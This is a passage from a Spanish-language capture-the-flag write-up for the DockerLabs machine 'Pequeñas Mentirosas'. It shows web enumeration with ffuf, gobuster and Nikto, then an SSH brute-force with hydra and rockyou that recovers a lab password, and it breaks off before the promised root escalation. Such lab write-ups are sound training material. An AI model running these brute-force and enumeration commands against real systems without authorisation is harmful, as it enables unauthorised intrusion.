# Writeup: Pequeñas Mentirosas – DockerLabs

La máquina **Pequeñas Mentirosas** es un entorno Docker que expone un servicio HTTP en el puerto 80 y un servicio SSH en el puerto 22. Durante el proceso de enumeración inicial se identificaron estos dos puertos abiertos, pero el servicio web no reveló ninguna pista útil al principio.

El objetivo de esta máquina es ganar acceso al sistema mediante fuerza bruta por SSH, aprovechando pistas sutiles sobre credenciales, y luego escalar privilegios explotando la capacidad de ejecutar scripts en Python como root.

## Enumeración

Comenzamos accediendo al puerto 80 y realizando un análisis básico de directorios mediante `ffuf` y `gobuster`. Sin embargo, no se reveló nada útil con los siguientes comandos:

```bash
ffuf -u http://172.17.0.2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 85
```

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/dirb/wordlists/common.txt -o directorios.txt
```

Posteriormente se lanzó un escaneo con **Nikto**, que tampoco identificó vulnerabilidades relevantes. Probamos entonces escanear archivos potenciales con extensiones comunes:

```bash
ffuf -u http://172.17.0.2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.zip,.tar,.log,.conf,.inc -mc 200
```

Tampoco hubo éxito. Ni siquiera con una lista más precisa:

```bash
ffuf -u http://172.17.0.2/./FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak,.zip,.tar,.log,.conf,.inc -mc 200
```

Al ver que el servicio web no ofrecía ninguna entrada clara, decidimos cambiar de enfoque.

## Ataque por fuerza bruta a SSH

La única pista disponible en la página web mencionaba: *"Encuentra la clave para A en los archivos."* Esto nos llevó a suponer que el usuario podría llamarse **a** o **A**.

Se intentó un ataque de fuerza bruta por SSH usando `hydra`, con el usuario **a** (en minúsculas) y el diccionario rockyou:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -vV -f -o resultados.txt
```

La contraseña encontrada fue `secret`, lo que nos permitió iniciar sesi